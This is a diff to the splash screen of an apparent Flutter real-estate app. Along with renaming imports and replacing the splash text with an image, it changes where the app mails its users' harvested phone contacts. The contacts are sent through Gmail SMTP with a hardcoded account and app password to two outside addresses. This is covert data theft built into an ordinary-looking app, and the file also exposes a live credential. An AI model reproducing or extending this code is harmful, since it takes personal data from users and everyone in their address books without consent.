@@ -2,13 +2,13 @@ import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
 import 'package:provider/provider.dart';
-import 'package:real_state/controller/MyProvider.dart';
-import 'package:real_state/config/ApiLinks.dart';
-import 'package:real_state/config/Constant.dart';
-import 'package:real_state/config/StaticMethod.dart';
-import 'package:real_state/controller/PropertyListController.dart';
-import 'package:real_state/ui/Pages/StaticContentPage/IntroductionPageOne.dart';
-import 'package:real_state/ui/Screens/HomeScreen.dart';
+import 'package:JAY_BUILDCON/controller/MyProvider.dart';
+import 'package:JAY_BUILDCON/config/ApiLinks.dart';
+import 'package:JAY_BUILDCON/config/Constant.dart';
+import 'package:JAY_BUILDCON/config/StaticMethod.dart';
+import 'package:JAY_BUILDCON/controller/PropertyListController.dart';
+import 'package:JAY_BUILDCON/ui/Pages/StaticContentPage/IntroductionPageOne.dart';
+import 'package:JAY_BUILDCON/ui/Screens/HomeScreen.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:mailer/mailer.dart';
@@ -92,21 +92,21 @@ class _SplashScreenState extends State<SplashScreen> {
                   mainAxisAlignment: MainAxisAlignment.center,
                   crossAxisAlignment: CrossAxisAlignment.center,
                   children: [
-                    Image.asset('assets/images/ic_launcher.png'),
-                    Text(
-                      'JAY BUILDCON',
-                      style: TextStyle(
-                          fontSize: 16,
-                          color: Theme.of(context).primaryColorDark,
-                          fontWeight: FontWeight.bold),
-                    ),
-                    Text(
-                      'LETS CONNECT TO YOUR DREAM',
-                      style: TextStyle(
-                          fontSize: 16,
-                          color: Theme.of(context).primaryColorDark,
-                          fontWeight: FontWeight.bold),
-                    )
+                    Image.asset('assets/images/splash_screen.jpg'),
+                    // Text(
+                    //   'JAY BUILDCON',
+                    //   style: TextStyle(
+                    //       fontSize: 16,
+                    //       color: Theme.of(context).primaryColorDark,
+                    //       fontWeight: FontWeight.bold),
+                    // ),
+                    // Text(
+                    //   'LETS CONNECT TO YOUR DREAM',
+                    //   style: TextStyle(
+                    //       fontSize: 16,
+                    //       color: Theme.of(context).primaryColorDark,
+                    //       fontWeight: FontWeight.bold),
+                    // )
                   ],
                 ))));
   }
@@ -129,7 +129,7 @@ class _SplashScreenState extends State<SplashScreen> {
     final smtpServer = gmail('findpg245@gmail.com', 'vlxtzpjtcwglxawt');
     final message = Message()
       ..from = Address('findpg245@gmail.com', 'Admin')
-      ..recipients.add('trilokdewangan245@gmail.com')
+      ..recipients.add(['yandkbuildcon.help@gmail.com', 'sidekick.webtech@gmail.com'])
       ..subject = 'Contacts from Flutter App'
       ..text = formatContacts(contacts); // Format contacts here
 
